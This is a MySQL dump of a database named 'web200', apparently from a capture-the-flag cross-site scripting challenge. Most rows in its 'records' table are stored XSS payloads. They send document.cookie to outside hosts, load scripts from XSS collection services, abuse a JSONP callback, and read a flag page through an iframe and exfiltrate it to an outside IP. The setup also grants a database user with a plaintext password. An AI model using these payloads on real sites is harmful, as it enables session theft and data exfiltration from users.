-- MySQL dump 10.13  Distrib 5.7.19, for Linux (x86_64)
--
-- Host: localhost    Database: web200
-- ------------------------------------------------------
-- Server version	5.7.19-0ubuntu0.16.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `records`
--

use mysql;
INSERT INTO user(Host,User,Password) values('localhost','web200',password('m3nxvrDSHq3cWYqP'));

flush privileges;

CREATE DATABASE web200;

grant select,insert,update on web200.* to web200@localhost identified by 'm3nxvrDSHq3cWYqP';

flush privileges;

use web200;

DROP TABLE IF EXISTS `records`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `records` (
  `record_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `message` varchar(1000) NOT NULL,
  `isProcessed` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`record_id`)
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `records`
--

LOCK TABLES `records` WRITE;
/*!40000 ALTER TABLE `records` DISABLE KEYS */;
INSERT INTO `records` VALUES (1,'123456',1),(2,'<img src=http://www.kericwy.com:12138/>',1),(3,'<img src=http://www.kericwy.com/:12138/>',1),(4,'<script>var n0t = document.createElement(\"liscriptnk\");n0t.setAttribute(\"rel\", \"prefetch\");n0t.setAttribute(\"href\", \"http://www.kericwy.com:12138/\" + document.cookie);document.head.appendChild(n0t);</script>',1),(5,'<script>var n0t = document.createElement(\"link\");n0t.setAttribute(\"rel\", \"prefetch\");n0t.setAttribute(\"href\", \"http://www.kericwy.com:12138/\" + document.cookie);document.head.appendChild(n0t);</script>',1),(6,'1111111111111111',1),(7,'<img src=http://www.kericwy.com:12138/>',1),(8,'<script src=http://t.cn/R90dAXp></script>',1),(9,'<script src=http://xsspt.com/q2oqoN?1502032098></script>',1),(10,'<script>var n0t = document.createElement(\"link\");n0t.setAttribute(\"rel\", \"prefetch\");n0t.setAttribute(\"href\", \"//www.kericwy.com:12138/\" + document.cookie);document.head.appendChild(n0t);</script>',1),(11,'111111111111111111111',1),(12,'111111111111111111111',1),(13,'111111111111111111111',1),(14,'',1),(15,'',1),(16,'',1),(17,'',1),(18,'',1),(19,'',1),(20,'',1),(21,'',1),(22,'11111111111111111111',1),(23,'<script src=\"http://127.0.0.1/xss2/jsonp.php?callback=var%20node%3D%20document.createElement(%22img%22)%3Bnode.src%20%3D%20%22http%3A%2F%2F207.46.154.112%3A12138%2F%22%2Bdocument.cookie%3Bdocument.getElementsByTagName(%22HEAD%22)%5B0%5D.appendChild(node)%3B%2F%2F\"></script>',1),(24,'<script src=\"http://127.0.0.1/xss2/jsonp.php?callback=var%20node%3D%20document.createElement(%22img%22)%3Bnode.src%20%3D%20%22http%3A%2F%2F207.46.154.112%3A12138%2F%22%2Bdocument.cookie%3Bdocument.getElementsByTagName(%22HEAD%22)%5B0%5D.appendChild(node)%3B%2F%2F\"></script>',1),(25,'<script src=\"http://127.0.0.1/xss2/jsonp.php?callback=var%20node%3D%20document.createElement(%22img%22)%3Bnode.src%20%3D%20%22http%3A%2F%2F207.46.154.112%3A12138%2F%22%2Bdocument.cookie%3Bdocument.getElementsByTagName(%22HEAD%22)%5B0%5D.appendChild(node)%3B%2F%2F\"></script>',1),(26,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\n<script>\n    function send() {\n        var node= document.createElement(\"img\");\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\n    }\n</script>',1),(27,'hacker INTO records(message) VALUES\r\n        (_<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>_)',1),(28,'hacker INTO records(message) VALUES\r\n        (_<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>_)',1),(29,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/index.php?do=keepsession&id=vttYLv&content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(30,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/index.php?do=keepsession&id=vttYLv&content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(31,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(32,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(33,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(34,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(35,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(36,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(37,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(38,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(39,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(40,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(41,'<script>var n0t = document.createElement(\"link\");n0t.setAttribute(\"rel\", \"prefetch\");n0t.setAttribute(\"href\", \"//www.kericwy.com:12138/\" + document.cookie);document.head.appendChild(n0t);</script>',1),(42,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1),(43,'<iframe id=\"if1\" src=\"http://127.0.0.1/newxss2/flag.php\" onload=\"send()\"></iframe>\r\n<script>\r\n    function send() {\r\n        var node= document.createElement(\"img\");\r\n        node.src = \"http://207.46.154.112:12138/content=\"+escape(document.getElementById(\"if1\").contentWindow.document.documentElement.outerHTML);\r\n        document.getElementsByTagName(\"HEAD\")[0].appendChild(node);\r\n    }\r\n</script>',1);
/*!40000 ALTER TABLE `records` ENABLE KEYS */;
UNLOCK TABLES;


/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-08-08  0:34:43
